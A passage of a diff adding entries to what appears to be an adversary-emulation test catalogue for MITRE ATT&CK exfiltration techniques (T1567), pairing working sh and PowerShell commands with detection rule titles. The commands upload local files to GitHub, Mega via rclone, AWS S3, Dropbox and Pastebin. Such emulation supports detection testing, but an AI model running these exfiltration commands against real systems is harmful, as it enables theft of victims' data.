+          "command": "GHUser=\"#{github.user.name}\";\nGHRepo=\"#{github.repository.name}\";\nGHPAT=\"#{github.access.token}\";\nGHBranch='#{github.repository.branch}';\nLocalFile='#{host.dir.compress}';\nHeader=\"Authorization: token $GHPAT\";\nRemoteName=\"$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename $LocalFile)\";\necho \"{\\\"message\\\":\\\"Committed $RemoteName\\\", \\\"branch\\\":\\\"$GHBranch\\\", \\\"content\\\":\\\"\" >/tmp/b64;\nbase64 -w 0 $LocalFile >>/tmp/b64;\necho \"\\\"}\" >>/tmp/b64;\ncontent=$(curl -s -X PUT -H \"Accept: application/vnd.github.v3+json\" -H \"$Header\" https://api.github.com/repos/$GHUser/$GHRepo/contents/$RemoteName -d @/tmp/b64);\nrm /tmp/b64;",
+          "cleanup": null
+        },
+        {
+          "executor": "psh,pwsh",
+          "command": "$GHUser = \"#{github.user.name}\";\n$GHRepo = \"#{github.repository.name}\";\n$GHPAT = \"#{github.access.token}\";\n$GHBranch = '#{github.repository.branch}';\n$token = $GHUser + \":\" + $GHPAT;\n$basetoken = [System.Convert]::ToBase64String([char[]]$token);\n$Headers = @{\n    Authorization = 'Basic {0}' -f $basetoken;\n};\n$file = (Get-Item #{host.dir.compress});\n$RemoteName = \"$(Get-Date -Format yyyymmddhhmmss)-exfil-#{paw}-$($file.name)\";\n$uri = \"https://api.github.com/repos/\" + $GHUser + \"/\" + $GHRepo + \"/contents/\" + $RemoteName;\n\n$FileBytes = Get-Content -Path $file.FullName -Encoding Byte;\n$Base64EncodedFileBytes = [System.Convert]::ToBase64String($FileBytes);\n$Body = @{\n    path = $RemoteName;\n    branch = $GHBranch;\n    content = $Base64EncodedFileBytes;\n    encoding = 'base64';\n    message = \"Committed \" + $RemoteName;\n} | ConvertTo-Json;\ntry {\n  $content = Invoke-RestMethod -Headers $Headers -Uri $uri -Body $Body -Method Put -ErrorAction SilentlyContinue;\n} catch {\n  if ($PSItem -notmatch \"but expected\") { $PSItem; }\n}",
+          "cleanup": null
+        },
+        {
+          "executor": "sh",
+          "command": "GHUser=\"#{github.user.name}\";\nGHRepo=\"#{github.repository.name}\";\nGHPAT=\"#{github.access.token}\";\nGHBranch='#{github.repository.branch}';\nLocalDirectory=#{host.dir.staged};\nHeader=\"Authorization: token $GHPAT\";\n\nfor file in $LocalDirectory/*.*; do\n  TempName=$(echo $file | sed \"s/ /-/g\")\n\tRemoteName=\"$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename \"$TempName\")\";\n\techo \"{\\\"message\\\":\\\"Committed $(basename $TempName) at: $(date)\\\", \\\"branch\\\":\\\"$GHBranch\\\", \\\"content\\\":\\\"\" >/tmp/b64;\n  base64 -w 0 \"$file\" >>/tmp/b64;\n  echo \"\\\"}\" >>/tmp/b64;\n\tcontent=$(curl -s -X PUT -H \"Accept: application/vnd.github.v3+json\" -H \"$Header\" https://api.github.com/repos/$GHUser/$GHRepo/contents/$RemoteName -d @/tmp/b64);\n  rm /tmp/b64;\ndone;",
+          "cleanup": null
+        },
+        {
+          "executor": "psh,pwsh",
+          "command": "$GHUser = \"#{github.user.name}\";\n$GHRepo = \"#{github.repository.name}\";\n$GHPAT = \"#{github.access.token}\";\n$GHBranch = '#{github.repository.branch}';\n$LocalDirectory = \"#{host.dir.staged}\";\n$token = $GHUser + \":\" + $GHPAT;\n$basetoken = [System.Convert]::ToBase64String([char[]]$token);\n$Headers = @{\n    Authorization = 'Basic {0}' -f $basetoken;\n};\n\n$Files = Get-ChildItem $LocalDirectory;\nforeach ($file in $Files){\n    $RemoteName = \"$(Get-Date -Format yyyymmddhhmmss)-exfil-#{paw}-$($file.name)\";\n    $uri = \"https://api.github.com/repos/\" + $GHUser + \"/\" + $GHRepo + \"/contents/\" + $RemoteName;\n    $FileBytes = Get-Content -Path $file.FullName -Encoding Byte;\n    $Base64EncodedFileBytes = [System.Convert]::ToBase64String($FileBytes);\n    $Body = @{\n        path = $file.Name;\n        branch = $GHBranch;\n        content = $Base64EncodedFileBytes;\n        encoding = 'base64';\n        message = \"Committed \" + $file.name + \" at: \" + (Get-Date);\n    } | ConvertTo-Json;\n    try {\n        $content = Invoke-RestMethod -Headers $Headers -Uri $uri -Body $Body -Method Put -ErrorAction SilentlyContinue;\n    } catch {\n        if ($PSItem -notmatch \"but expected\") { $PSItem; }\n        else { $content = Invoke-RestMethod -Headers $Headers -Uri $uri -Body $Body -Method Put -ErrorAction SilentlyContinue; }\n    }\n};",
+          "cleanup": null
+        }
+      ],
+      "detection_rules": [
+        {
+          "title": "Network Connection Initiated To DevTunnels Domain",
+          "logsource": {
+            "category": "network_connection",
+            "product": "windows"
+          },
+          "description": "Detects network connections to Devtunnels domains initiated by a process on a system. Attackers can abuse that feature to establish a reverse shell or persistence on a machine."
+        }
+      ]
+    },
+    {
+      "technique_id": "T1567.002",
+      "name": "Exfiltration Over Web Service: Exfiltration to Cloud Storage",
+      "description": "This test uses rclone to exfiltrate data to a remote cloud storage instance. (Mega)\nSee https://thedfirreport.com/2022/06/16/sans-ransomware-summit-2022-can-you-detect-this/",
+      "platforms": [
+        "windows",
+        "linux",
+        "macos",
+        "linux,windows,darwin"
+      ],
+      "commands": [
+        {
+          "executor": "powershell",
+          "command": "New-Item #{rclone_config_path}\\rclone -ItemType directory\nNew-Item #{rclone_config_path}\\rclone\\rclone.conf\ncd \"#{rclone_path}\"\n.\\rclone.exe config create #{remote_share} mega\nset-Content #{rclone_config_path}\\rclone\\rclone.conf \"[#{remote_share}] `n type = mega `n user = #{mega_user_account} `n pass = #{mega_user_password}\"\n.\\rclone.exe copy --max-size 1700k \"#{dir_to_copy}\" #{remote_share}:test -v",
+          "cleanup": "cd \"#{rclone_path}\"\n.\\rclone.exe purge #{remote_share}:test\n.\\rclone.exe config delete #{remote_share}:\nRemove-Item #{rclone_config_path}\\rclone -recurse -force -erroraction silentlycontinue\ncd c:\\\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\rclone.zip\"\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1567.002\" -recurse -force"
+        },
+        {
+          "executor": "powershell",
+          "command": "Write-Host \"Deploying AWS infrastructure... \" -NoNewLine\n$awsAccessKey = \"#{aws_access_key}\"\n$awsSecretKey = \"#{aws_secret_key}\"\ncd PathToAtomicsFolder/T1567.002/src/\nif ($awsAccessKey -eq \"\" -or $awsSecretKey -eq \"\") {\n  $env:AWS_PROFILE = \"#{aws_profile}\"\n} else {\n  $env:AWS_ACCESS_KEY_ID = \"$awsAccessKey\"\n  $env:AWS_SECRET_ACCESS_KEY = \"$awsSecretKey\"\n}\n$null = PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform init\n$null = PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform apply -var \"aws_region=#{aws_region}\" -auto-approve\nWrite-Host \"Done!\"\nWrite-Host \"Generating rclone config... \" -NoNewLine\n$config = @\"\n[exfils3]\ntype = s3\nprovider = AWS\nenv_auth = true\nregion = #{aws_region}\n\"@\n$config | Out-File -FilePath \"PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone.conf\" -Encoding ascii\nWrite-Host \"Done!\"\nWrite-Host \"Exfiltrating data... \" -NoNewLine\n$bucket = \"$(PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform output bucket)\".Replace(\"`\"\",\"\")\ncd PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone-v*\n$null = ./rclone copy --max-size 1700k \"PathToAtomicsFolder/../ExternalPayloads/T1567.002/data/\" exfils3:$bucket --config \"PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone.conf\"\nWrite-Host \"Done!\"",
+          "cleanup": "Write-Host \"Destroying AWS infrastructure... \" -NoNewLine\n$awsAccessKey = \"#{aws_access_key}\"\n$awsSecretKey = \"#{aws_secret_key}\"\ncd PathToAtomicsFolder/T1567.002/src/\nif ($awsAccessKey -eq \"\" -or $awsSecretKey -eq \"\") {\n  $env:AWS_PROFILE = \"#{aws_profile}\"\n} else {\n  $env:AWS_ACCESS_KEY_ID = \"$awsAccessKey\"\n  $env:AWS_SECRET_ACCESS_KEY = \"$awsSecretKey\"\n}\n$null = PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform destroy -var \"aws_region=#{aws_region}\" -auto-approve\nWrite-Host \"Done!\""
+        },
+        {
+          "executor": "psh",
+          "command": "$SourceFile = (Get-Item #{host.dir.compress});\n$RemoteName = \"$(Get-Date -Format yyyymmddhhmmss)-exfil-#{paw}-$($SourceFile.name)\";\n$TargetFilePath = \"/#{dropbox.target.dir}/$RemoteName\";\n$ApiKey = \"#{dropbox.api.key}\";\n\n$url = \"https://content.dropboxapi.com/2/files/upload\";\n\n$file = [IO.File]::ReadAllBytes($SourceFile);\n[net.httpWebRequest] $req = [net.webRequest]::create($url);\n\n$arg = '{ \"path\": \"' + $TargetFilePath + '\", \"mode\": \"add\", \"autorename\": true, \"mute\": false }';\n$authorization = \"Bearer \" + $ApiKey;\n\n$req.method = \"POST\";\n$req.Headers.Add(\"Authorization\", $authorization);\n$req.Headers.Add(\"Dropbox-API-Arg\", $arg);\n$req.ContentType = 'application/octet-stream';\n$req.ContentLength = $file.length;\n$req.TimeOut = 50000;\n$req.KeepAlive = $true;\n$req.Headers.Add(\"Keep-Alive: 300\");\n$reqst = $req.getRequestStream();\n$reqst.write($file, 0, $file.length);\n$reqst.flush();\n$reqst.close();\n\n[net.httpWebResponse] $res = $req.getResponse();\n$resst = $res.getResponseStream();\n$sr = new-object IO.StreamReader($resst);\n$result = $sr.ReadToEnd();\n$result;\n$res.close();",
+          "cleanup": null
+        },
+        {
+          "executor": "sh",
+          "command": "LocalFile='#{host.dir.compress}';\nRemoteName=\"$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename $LocalFile)\";\ncurl -X POST https://content.dropboxapi.com/2/files/upload\n    --header \"Authorization: Bearer #{dropbox.api.key}\"\n    --header \"Dropbox-API-Arg: {\\\"path\\\": \\\"/#{dropbox.target.dir}/$RemoteName\\\",\\\"mode\\\": \\\"add\\\",\\\"autorename\\\": true,\\\"mute\\\": false,\\\"strict_conflict\\\": false}\"\n    --header \"Content-Type: application/octet-stream\"\n    --data-binary @#{host.dir.compress}",
+          "cleanup": null
+        },
+        {
+          "executor": "native",
+          "command": "s3upload \"#{host.dir.compress}\" \"#{s3.source.region}\" \"#{s3.source.name}\" \"aws-#{paw}-compressed\" 45s",
+          "cleanup": null
+        },
+        {
+          "executor": "sh",
+          "command": "LocalFile='#{host.dir.compress}';\nRemoteName=\"exfil-#{paw}-$(basename $LocalFile)\";\naws s3 cp #{host.dir.compress} s3://#{s3.source.name}/$RemoteName;",
+          "cleanup": "LocalFile='#{host.dir.compress}';\nRemoteName=\"exfil-#{paw}-$(basename $LocalFile)\";\naws s3 rm s3://#{s3.source.name}/$RemoteName;"
+        },
+        {
+          "executor": "psh",
+          "command": "$SourceFile = (Get-Item #{host.dir.compress});\n$RemoteName = \"exfil-#{paw}-$($SourceFile.name)\";\naws s3 cp #{host.dir.compress} s3://#{s3.source.name}/$RemoteName;",
+          "cleanup": "$SourceFile = (Get-Item #{host.dir.compress});\n$RemoteName = \"exfil-#{paw}-$($SourceFile.name)\";\naws s3 rm s3://#{s3.source.name}/$RemoteName;"
+        }
+      ],
+      "detection_rules": [
+        {
+          "title": "DNS Query for Anonfiles.com Domain - DNS Client",
+          "logsource": {
+            "product": "windows",
+            "service": "dns-client",
+            "definition": "Requirements: Microsoft-Windows-DNS Client Events/Operational Event Log must be enabled/collected in order to receive the events."
+          },
+          "description": "Detects DNS queries for anonfiles.com, which is an anonymous file upload platform often used for malicious purposes"
+        },
+        {
+          "title": "DNS Query To MEGA Hosting Website - DNS Client",
+          "logsource": {
+            "product": "windows",
+            "service": "dns-client",
+            "definition": "Requirements: Microsoft-Windows-DNS Client Events/Operational Event Log must be enabled/collected in order to receive the events."
+          },
+          "description": "Detects DNS queries for subdomains related to MEGA sharing website"
+        },
+        {
+          "title": "DNS Query To Ufile.io - DNS Client",
+          "logsource": {
+            "product": "windows",
+            "service": "dns-client",
+            "definition": "Requirements: Microsoft-Windows-DNS Client Events/Operational Event Log must be enabled/collected in order to receive the events."
+          },
+          "description": "Detects DNS queries to \"ufile.io\", which was seen abused by malware and threat actors as a method for data exfiltration"
+        },
+        {
+          "title": "DNS Query for Anonfiles.com Domain - Sysmon",
+          "logsource": {
+            "product": "windows",
+            "category": "dns_query"
+          },
+          "description": "Detects DNS queries for \"anonfiles.com\", which is an anonymous file upload platform often used for malicious purposes"
+        },
+        {
+          "title": "DNS Query To MEGA Hosting Website",
+          "logsource": {
+            "product": "windows",
+            "category": "dns_query"
+          },
+          "description": "Detects DNS queries for subdomains related to MEGA sharing website"
+        },
+        {
+          "title": "DNS Query To Ufile.io",
+          "logsource": {
+            "product": "windows",
+            "category": "dns_query"
+          },
+          "description": "Detects DNS queries to \"ufile.io\", which was seen abused by malware and threat actors as a method for data exfiltration"
+        },
+        {
+          "title": "Rclone Config File Creation",
+          "logsource": {
+            "product": "windows",
+            "category": "file_event"
+          },
+          "description": "Detects Rclone config files being created"
+        },
+        {
+          "title": "Suspicious Dropbox API Usage",
+          "logsource": {
+            "category": "network_connection",
+            "product": "windows"
+          },
+          "description": "Detects an executable that isn't dropbox but communicates with the Dropbox API"
+        },
+        {
+          "title": "Network Connection Initiated To Mega.nz",
+          "logsource": {
+            "category": "network_connection",
+            "product": "windows"
+          },
+          "description": "Detects a network connection initiated by a binary to \"api.mega.co.nz\".\nAttackers were seen abusing file sharing websites similar to \"mega.nz\" in order to upload/download additional payloads."
+        },
+        {
+          "title": "PUA - Rclone Execution",
+          "logsource": {
+            "product": "windows",
+            "category": "process_creation"
+          },
+          "description": "Detects execution of RClone utility for exfiltration as used by various ransomwares strains like REvil, Conti, FiveHands, etc"
+        },
+        {
+          "title": "PUA - Restic Backup Tool Execution",
+          "logsource": {
+            "product": "windows",
+            "category": "process_creation"
+          },
+          "description": "Detects the execution of the Restic backup tool, which can be used for data exfiltration.\nThreat actors may leverage Restic to back up and exfiltrate sensitive data to remote storage locations, including cloud services.\nIf not legitimately used in the enterprise environment, its presence may indicate malicious activity."
+        }
+      ]
+    },
+    {
+      "technique_id": "T1567.003",
+      "name": "Exfiltration Over Web Service: Exfiltration to Text Storage Sites",
+      "description": "This test uses HTTP POST to exfiltrate data to a remote text storage site. (pastebin)                             \nSee https://web.archive.org/web/20201107203304/https://www.echosec.net/blog/what-is-pastebin-and-why-do-hackers-love-it",
+      "platforms": [
+        "windows"
+      ],
+      "commands": [
+        {
+          "executor": "powershell",
+          "command": "$apiKey = \"#{api_key}\"\n$content = \"secrets, api keys, passwords...\"\n$url = \"https://pastebin.com/api/api_post.php\"\n$postData = @{\n  api_dev_key   = $apiKey\n  api_option    = \"paste\"\n  api_paste_code = $content\n}\n$response = Invoke-RestMethod -Uri $url -Method Post -Body $postData\nWrite-Host \"Your paste URL: $response\"",
+          "cleanup": null
+        }
+      ],
+      "detection_rules": []
+    }
+  ]
+}
